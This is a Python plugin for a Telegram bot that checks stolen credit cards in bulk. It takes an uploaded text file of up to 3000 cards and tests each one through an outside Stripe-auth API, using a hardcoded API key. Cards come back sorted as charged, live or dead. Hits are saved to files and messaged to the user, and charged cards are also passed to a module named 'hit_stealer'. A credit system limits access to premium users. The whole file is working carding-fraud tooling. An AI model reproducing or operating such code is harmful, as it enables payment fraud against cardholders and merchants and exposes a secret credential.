from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio, time, os, httpx, traceback
from datetime import date
from plugins.func.users_sql import fetchinfo, updatedata, insert_reg_data, setantispamtime
from plugins.gates.TOOLS.getcc_for_txt import getcc_for_txt
from plugins.tools.hit_stealer import send_hit_if_approved

stop_flag = False
pause_flag = False

API_URL = "https://barryxapi.xyz/str_auth"
API_KEY = "BRY-HEIQ7-KPWYR-DRU67"

async def gcgenfunc(length=6):
    import random, string
    return "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def elapsed_time(start):
    elapsed = time.perf_counter() - start
    return int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)

def parse_stripe_response(json_data: dict) -> dict:
    msg = (json_data.get("message") or "").lower()
    if "approved" in msg:
        return {"hits": "CHARGED", "response": json_data.get("message", "")}
    elif any(k in msg for k in ["insufficient", "not enough", "incorrect_cvc", "cvc", "live", "authentication"]):
        return {"hits": "LIVE", "response": json_data.get("message", "")}
    else:
        return {"hits": "DEAD", "response": json_data.get("message", "")}

async def save_cc(result, file_name):
    try:
        cc = result["fullz"]
        resp = result["response"]
        emoji = {
            "CHARGED": "✅",
            "LIVE": "✅"
        }.get(result["hits"], "❌")
        all_file = os.path.join("HITS", file_name)
        with open(all_file, "a", encoding="utf-8") as f:
            f.write(f"{emoji} {cc} -> {resp}\n")
        if result["hits"] == "CHARGED":
            charged_file = os.path.join("HITS", f"CHARGED_{file_name}")
            with open(charged_file, "a", encoding="utf-8") as f:
                f.write(f"{emoji} {cc} -> {resp}\n")
    except Exception as e:
        print("Save error:", str(e))

async def get_ui(client, msg, total, key, chk_done, charged, live, start):
    if stop_flag:
        return await client.edit_message_text(
            msg.chat.id, msg.id,
            f"⛔ <b>Process Stopped</b>\n\n"
            f"<b>Checked:</b> {chk_done}/{total}\n"
            f"<b>Approved:</b> {charged}\n"
            f"<b>Live:</b> {live}\n"
            f"<b>Dead:</b> {chk_done - charged - live}"
        )

    h, m, s = elapsed_time(start)
    btn_text = "▶️ Resume" if pause_flag else "⏸ Pause"
    callback_data = "resume_checking" if pause_flag else "pause_checking"
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton(btn_text, callback_data=callback_data)],
        [InlineKeyboardButton("⛔ Stop", callback_data="stop_checking")]
    ])
    await client.edit_message_text(
        msg.chat.id, msg.id,
        f"<b>Gateway:</b> Stripe Auth ♻️\n\n"
        f"<b>Checked:</b> {chk_done}/{total}\n"
        f"<b>Approved:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {h}h {m}m {s}s\n"
        f"<b>Key:</b> <code>{key}</code>",
        reply_markup=reply_markup
    )

async def get_done(client, msg, total, key, hitsfile, chk_done, charged, live, start):
    h, m, s = elapsed_time(start)
    caption = (
        f"<b>Gateway:</b> Stripe Auth ♻️\n\n"
        f"<b>Total:</b> {total}\n"
        f"<b>Checked:</b> {chk_done}\n"
        f"<b>Approved:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {h}h {m}m {s}s\n"
        f"<b>Key:</b> <code>{key}</code>"
    )
    await msg.reply_document(document=hitsfile, caption=caption, quote=True)

async def check_stripe(card, user_id, session):
    try:
        r = await session.get(API_URL, params={"key": API_KEY, "card": card})
        res = r.json()
        parsed = parse_stripe_response(res)
        return {"hits": parsed["hits"], "fullz": card, "response": parsed["response"]}
    except Exception as e:
        return {"hits": "DEAD", "fullz": card, "response": str(e)}

@Client.on_message(filters.command("stxt", ["/", "."]))
async def stripe_txt_cmd(client, message):
    global stop_flag, pause_flag
    stop_flag = False
    pause_flag = False

    try:
        if not message.reply_to_message or not message.reply_to_message.document:
            return await message.reply_text("❌ Reply to a .txt file with /stxt", quote=True)

        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        reg = fetchinfo(user_id)
        if not reg:
            insert_reg_data(user_id, username, 200, str(date.today()))
            reg = fetchinfo(user_id)

        role = reg[2] or "FREE"
        credits = int(reg[5] or 0)

        if role != "PREMIUM":
            return await message.reply("❌ Only PREMIUM users can use this command.")

        randkey = await gcgenfunc()
        key = f"stxt{user_id}_{randkey}"
        file_name = f"{key}.txt"
        download_path = os.path.join("downloads", file_name)
        os.makedirs("downloads", exist_ok=True)
        os.makedirs("HITS", exist_ok=True)

        await message.reply_to_message.download(file_name=download_path)
        valid, cc_list = await getcc_for_txt(download_path, role)
        if not valid:
            return await message.reply_text(cc_list, quote=True)

        total_cards = len(cc_list)
        if total_cards > 3000:
            return await message.reply(f"❌ Max 3000 cards allowed. You sent {total_cards}.")

        if credits < total_cards:
            return await message.reply(f"❌ Not enough credits. Need {total_cards - credits} more.")

        status_msg = await message.reply("⏳ Starting Stripe Auth Check...", quote=True)
        hitsfile = os.path.join("HITS", file_name)
        chk_done = charged = live = 0
        start_time = time.perf_counter()

        async with httpx.AsyncClient(timeout=30) as session:
            BATCH = 10
            for i in range(0, total_cards, BATCH):
                if stop_flag:
                    break
                while pause_flag:
                    await asyncio.sleep(1)
                    await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time)

                batch = cc_list[i:i + BATCH]
                tasks = [check_stripe(c["fullz"], user_id, session) for c in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for r in results:
                    chk_done += 1
                    if isinstance(r, Exception):
                        r = {"hits": "DEAD", "fullz": "Unknown", "response": str(r)}
                    hits = r["hits"]
                    if hits == "CHARGED":
                        charged += 1
                    elif hits == "LIVE":
                        live += 1
                    if hits in ["CHARGED", "LIVE"]:
                        label = "Approved ✅" if hits == "CHARGED" else "Live ✅"
                        await client.send_message(
                            message.from_user.id,
                            f"<b>{label}</b>\n<code>{r['fullz']}</code>\n<b>Response:</b> {r['response']}"
                        )
                        if hits == "CHARGED":
                            await send_hit_if_approved(r['fullz'], r)
                    await save_cc(r, file_name)

                await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time)

        if not stop_flag:
            await get_done(client, message, total_cards, key, hitsfile, chk_done, charged, live, start_time)
            updatedata(user_id, "credits", credits - total_cards)
            setantispamtime(user_id)
        else:
            await message.reply("⛔ Process stopped by user.")

    except Exception:
        await message.reply_text(f"❌ Error:\n<code>{traceback.format_exc()}</code>", quote=True)

@Client.on_callback_query(filters.regex("stop_checking"))
async def stop_checking(client, cb):
    global stop_flag
    stop_flag = True
    await cb.answer("⛔ Stopping...")

@Client.on_callback_query(filters.regex("pause_checking"))
async def pause_checking(client, cb):
    global pause_flag
    pause_flag = True
    await cb.answer("⏸ Paused")

@Client.on_callback_query(filters.regex("resume_checking"))
async def resume_checking(client, cb):
    global pause_flag
    pause_flag = False
    await cb.answer("▶️ Resumed")
